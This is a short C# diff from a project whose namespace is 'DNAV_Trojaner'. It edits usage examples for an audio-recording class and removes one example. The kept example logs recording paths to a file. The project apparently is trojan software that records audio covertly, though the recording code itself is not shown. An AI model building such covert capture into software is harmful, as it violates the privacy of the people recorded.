@@ -24,14 +24,6 @@ namespace DNAV_Trojaner {
             aufnahme01.stop();
 
         //! Einbindungsmöglichkeit 2
-            //? Start mit auto Stop
-            Audio aufnahme02 = new Audio(@"test02");
-            aufnahme02.start(sec);
-
-            //! Nur auf Ende warten..
-            System.Threading.Thread.Sleep(sec * 1000);
-
-        //! Einbindungsmöglichkeit 3
             //? Start mit Loop und Funktion
             Audio aufnahme03 = new Audio(@"test03");
             Audio.Execution func = (path) => {
@@ -41,7 +33,7 @@ namespace DNAV_Trojaner {
                 sw.Write(path+"\n");
                 sw.Close();
             };
-            aufnahme03.start(sec, func);
+            aufnahme03.start(sec, func); //Func ist optional
         //! Läuft nun bis Beendung.     
             //! Abbruch Via 
             aufnahme03.stop();
